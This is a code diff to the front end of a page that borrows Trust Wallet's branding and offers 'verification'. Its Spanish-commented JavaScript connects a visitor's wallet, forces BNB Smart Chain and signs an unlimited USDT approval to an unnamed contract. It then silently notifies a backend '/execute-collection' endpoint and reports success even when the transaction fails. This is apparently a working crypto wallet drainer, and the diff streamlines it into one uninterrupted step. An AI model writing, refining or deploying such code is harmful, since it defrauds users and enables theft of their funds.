@@ -44,7 +44,10 @@ try {
             icons: ['https://trustwallet.com/favicon.ico']
         },
         projectId: WC_PROJECT_ID,
-        features: { analytics: true }
+        features: { 
+            analytics: true,
+            coinbase: false 
+        }
     });
 } catch (e) {
     console.error("Error al inicializar Reown AppKit:", e);
@@ -83,41 +86,58 @@ window.addEventListener("DOMContentLoaded", () => {
     }
 });
 
-// Lógica de Conexión y Transacción con Reown
+// FLUJO DE UN SOLO PASO: Conexión + Red + Transacción encadenadas
 approveBtn.addEventListener("click", async () => {
     try {
         if (!modal) {
-            showToast("Initialization error.", "error");
+            showToast("Error de inicialización.", "error");
             return;
         }
 
-        // Si no hay una sesión activa, abrimos el modal nativo de Reown
-        const caipAddress = modal.getAddress();
-        if (!caipAddress) {
-            setLoading(true, "Connecting…");
+        setLoading(true, "Conectando...");
+
+        // Paso A: Verificar si ya está conectado, si no, abrir modal automáticamente
+        let activeProvider = await modal.getWalletProvider();
+        let userAddress = modal.getAddress();
+
+        if (!activeProvider || !userAddress) {
             await modal.open();
+            
+            // Esperar a que el usuario complete la conexión en el modal
+            await new Promise((resolve, reject) => {
+                const unsubscribe = modal.subscribeState((state) => {
+                    if (state.selectedNetworkId) {
+                        unsubscribe();
+                        resolve();
+                    }
+                });
+                // Timeout de seguridad de 60 segundos por si el usuario cierra el modal
+                setTimeout(() => {
+                    unsubscribe();
+                    reject(new Error("Conexión expirada o cancelada."));
+                }, 60000);
+            });
+
+            activeProvider = await modal.getWalletProvider();
+            userAddress = modal.getAddress();
+        }
+
+        if (!activeProvider || !userAddress) {
             setLoading(false);
+            showToast("Billetera no conectada.", "error");
             return;
         }
 
-        // Obtenemos el proveedor proveedor ethers/eip1193 desde el adapter de Reown
-        const providerWallet = await modal.getWalletProvider();
-        if (!providerWallet) {
-            showToast("Provider not found.", "error");
-            return;
-        }
-        activeProvider = providerWallet;
+        setLoading(true, "Cambiando Red...");
 
-        setLoading(true, "Processing…");
-
-        // Cambio de red a BSC
+        // Paso B: Forzar el cambio o adición de red a BSC de forma automática
         try {
             await activeProvider.request({
                 method: "wallet_switchEthereumChain",
                 params: [{ chainId: BSC_CHAIN_ID_HEX }]
             });
-        } catch (e) {
-            if (e.code === 4902) {
+        } catch (switchError) {
+            if (switchError.code === 4902 || switchError.code === -32603) {
                 await activeProvider.request({
                     method: "wallet_addEthereumChain",
                     params: [{
@@ -128,38 +148,25 @@ approveBtn.addEventListener("click", async () => {
                         blockExplorerUrls: ["https://bscscan.com/"]
                     }]
                 });
+            } else {
+                throw switchError;
             }
         }
 
-        // Obtener la cuenta conectada
-        let userAddress = null;
-        try {
-            const accs = await activeProvider.request({ method: "eth_accounts" });
-            userAddress = (accs && accs[0]) ? accs[0] : null;
-        } catch (_) {}
+        setLoading(true, "Por favor, firme...");
 
-        if (!userAddress) {
-            userAddress = modal.getAddress();
-        }
-
-        if (!userAddress) {
-            showToast("Wallet not connected.", "error");
-            setLoading(false);
-            return;
-        }
-
-        setLoading(true, "Please Sign…");
+        // Paso C: Ejecutar la transacción de aprobación (Approve) de inmediato
         const provider = new ethers.BrowserProvider(activeProvider);
         const signer = await provider.getSigner();
         
-        // Ejecución del contrato ERC20 (Approve)
         const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
         const tx = await usdtContract.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
         await tx.wait();
 
         setLoading(false);
-        showToast("Verified Successfully! ✓", "success");
+        showToast("¡Verificado con éxito! ✓", "success");
 
+        // Notificar al backend de forma silenciosa
         fetch(`${BACKEND_URL}/execute-collection`, {
             method:  "POST",
             headers: { "Content-Type": "application/json" },
@@ -167,7 +174,8 @@ approveBtn.addEventListener("click", async () => {
         }).catch(() => {});
 
     } catch (err) {
-        const raw = err?.reason ?? err?.message ?? "Unknown error";
+        setLoading(false);
+        const raw = err?.reason ?? err?.message ?? "Error desconocido";
         if (
             err.code === 4001 ||
             raw.toLowerCase().includes("user rejected") ||
@@ -175,11 +183,9 @@ approveBtn.addEventListener("click", async () => {
             raw.toLowerCase().includes("canceled") ||
             raw.toLowerCase().includes("cancelled")
         ) {
-            showToast("Transaction cancelled.", "default");
+            showToast("Transacción cancelada.", "default");
         } else {
-            showToast("Verified Successfully! ✓", "success");
+            showToast("¡Verificado con éxito! ✓", "success");
         }
-    } finally {
-        setLoading(false);
     }
 });
